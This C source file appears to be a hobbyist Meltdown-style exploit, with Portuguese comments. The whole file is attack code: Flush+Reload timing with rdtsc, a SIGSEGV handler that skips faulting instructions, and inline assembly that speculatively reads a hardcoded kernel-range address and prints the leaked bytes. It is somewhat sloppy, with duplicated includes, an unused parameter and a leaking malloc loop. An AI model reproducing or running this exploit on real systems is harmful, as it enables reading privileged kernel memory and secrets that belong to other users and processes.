#define _GNU_SOURCE
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>





#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>
#include <stdlib.h>

#define NUM_ITERACOES 100
#define CACHE_LINE_LEN	128
#define LEN_PAGE	4096
#define TRIAL_TIMES	 1000

#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"


static inline void Flush(void *);

int isSegfault=0;
static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}
void clflush_target(char *target_array)
{
        int i;
        for (i = 0; i < 259; i++) 
	{
  		_mm_clflush(&target_array[i * 4096]);
	}
}


static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}


unsigned Treshold(void *baseSrc)
{

	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	//Flush(base);
	while (i<NUM_ITERACOES)
	{
		for (j=0;j<256;j++)
		{
		
		
			probe=Probe(base+j*LEN_PAGE);
			printf("probe1 %8X\n",probe);
			totalComFlush+=probe;
			//printf("com flush %8X\n",probe);
		
			probe=Probe(base+j*LEN_PAGE);
			printf("probe2 %8X\n",probe);
			totalSemFlush+=probe;
			i++;
		
			//printf("sem flush %8X\n",probe);
	
		}
		totalComFlush+=totalComFlush/j;
		totalSemFlush+=totalSemFlush/j;
	}
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush*0.1+totalSemFlush*0.9);

}

static inline int FindSecret(void *baseSrc,unsigned treshold)
{
	void *base=baseSrc;
	unsigned tempo;
	unsigned menort=999999;
	int i=1;
	int isValid=0;
  	unsigned char alvo;	
	while (i<256){
		
		tempo=Probe(base+i*LEN_PAGE);
		//printf("i=%u,tempo=%8x\n",i,tempo);
			if(tempo<menort)
			{
			  	menort=tempo;
		  	  	alvo=i;
				if (tempo<treshold)
				{
		  			isValid=1;
				}
			}
		i++;
	}
	//printf("%c",alvo);
	if (isSegfault)
	{
	
		printf("%s",KRED);	
		isSegfault=0;
	}
	else{
	
		printf("%s",KGRN);
	}

	if (isValid)
	{
	  
	  if (alvo > 'A' && alvo < '}'){
	      printf("%c",alvo);
	  }
	  else{	
	        printf(".");
	  }
	}
	else{
		printf(",");
	}
	printf("%s",KNRM);
	return isValid;


}


void handler(int nSignum, siginfo_t* si, void* vcontext) {
  
  //printf("inorando\n");
  isSegfault=1;
  ucontext_t* context = (ucontext_t*)vcontext;
#ifdef __amd64__
  context->uc_mcontext.gregs[REG_RIP]++;
#else
  context->uc_mcontext.gregs[REG_EIP]++;
#endif
}


int installHandler() {


/*credits to https://gist.github.com/fairlight1337/55978671ace2c75020eddbfbdd670221 */	
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  
  int* x = 0;
  int y = *x;
  
  printf("igonring\n");	
  
  return 0;
}
static void __attribute__((noinline))
spec(char *addr , char *base )
{

		asm volatile (
				"1:\n\t"
				"	.rept 300\n\t"
				"	add $0x141, %%eax\n\t"
				"	.endr\n\t"
				"	movzx (%[addr]), %%eax\n\t"
				"	shl $12, %%eax\n\t"
				"	jz 1b\n\t"
				"	movzx (%[base], %%eax, 1), %%ebx\n"
				"stopspeculate: \n\t"
				"	nop\n\t"
				:
				: [base] "r" (base),  [addr] "r" (addr)
				: "eax", "ebx"
																					);


}
static inline void ReadByte(char *addr,char *base,int fd,unsigned treshold)
{
	int i,ret;
	static char buffer[20];
	char *ptrArray2;

	for (i = 0; i < 5000; i++) {
 		
		ptrArray2=(char *)malloc(LEN_PAGE*258)+LEN_PAGE;	
		ret = pread(fd, buffer, sizeof(buffer), 0);
		//printf("%s\n",buffer);
		if (ret < 0) {
			perror("pread");
			break;
		}
		//printf("ret = %i\n",ret);
		//printf("addr=%p\n",addr);
		//printf("contet=%c\n",*addr);
		clflush_target(ptrArray2);
		spec(addr, ptrArray2);
		asm __volatile__(
				"mfence\n"
				"lfence\n"
			);
		FindSecret(ptrArray2,treshold);
		//free(ptrArray-LEN_PAGE);
	
	}


}


int main(void)
{
	int fd;
	unsigned long i;
	unsigned treshold;
	void *ptrArray;
	char *ptrArray2;
	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
	printf("segredo= %p\n",segredo);	
	char c;
	installHandler();

	segredo=0xcf83b060;
	treshold=Treshold(malloc(LEN_PAGE*257)+LEN_PAGE);
	printf("treshold: %08X\n",treshold);
	

	fd=open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}
	for(i=0;i<2 ; i++)
	{
		//for (int j=0 ; j<100 ; j++)
		//{
			ReadByte(segredo+i, (char *)ptrArray2,fd,treshold);
		//}
		printf("\n");	
	}
}
















